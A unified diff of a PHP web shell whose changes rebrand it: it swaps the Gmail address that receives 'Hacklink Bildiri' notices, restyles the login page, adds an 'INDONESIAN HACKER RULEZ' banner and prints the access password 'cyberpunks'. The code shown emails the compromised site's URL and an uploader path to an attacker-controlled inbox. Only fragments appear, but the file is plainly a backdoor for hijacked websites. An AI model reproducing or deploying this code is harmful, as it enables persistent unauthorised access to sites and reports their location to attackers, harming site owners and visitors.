@@ -1,4 +1,4 @@
-   <?php  
+<?php  
 @session_start();
 @set_time_limit(0);
 $this_file = __FILE__;
@@ -34,8 +34,8 @@ $yol = "http://".$_SERVER['HTTP_HOST']."".$_SERVER['REQUEST_URI']."";
 $y = '<h1>Sender Yazdirildi.<br/> SITE YOL : '.$yol.'<br/>Sender Yolu : tmp/wp-uploader.php</h1>';
 $header .= "From: SheLL Boot <suppor@nic.org>\n"; 
 $header .= "Content-Type: text/html; charset=utf-8\n"; 
-@mail("papaku.hayker@gmail.com", "Hacklink Bildiri", "$y", $header); 
-@mail("papaku.hayker@gmail.com", "Hacklink Bildiri", "$y", $header); 
+@mail("rootcyberpunks@gmail.com", "Hacklink Bildiri", "$y", $header); 
+@mail("rootcyberpunks@gmail.com", "Hacklink Bildiri", "$y", $header); 
 }
 ignore_user_abort(true);
 ini_set('memory_limit', '-1');
@@ -100,7 +100,7 @@ if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
      echo '
 <style>
          body {
-            background: linear-gradient(135deg, darkslateblue 40%, #70e825 40%);
+            background: linear-gradient(135deg, darkslateblue 50%, #70e825 50%);
             height: 100vh;
             margin: 0;
             display: flex;
@@ -143,12 +143,11 @@ if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
 <div class="login-card">
 
       <img backgroudn src="https://i.ibb.co.com/YWWh2q5/df2b8cc-71c1e8b1-773b-491f-a671-20a975522009.gif" alt="banner" class="img-fluid">
+<br>
 
+<h1>$ INDONESIAN HACKER RULEZ $</h1>
 
-<h1>$INDONESIAN HACKER RULEZ$</h1>
-
-<center><font color="aqua"><font SIZE="3">::  _ Don’t Worry About It
-i am professional_  ::</font></font></center>
+<center><font color="aqua"><font SIZE="1">password:cyberpunks</font></center>
 
         <form method="post">
             <div class="form-group">
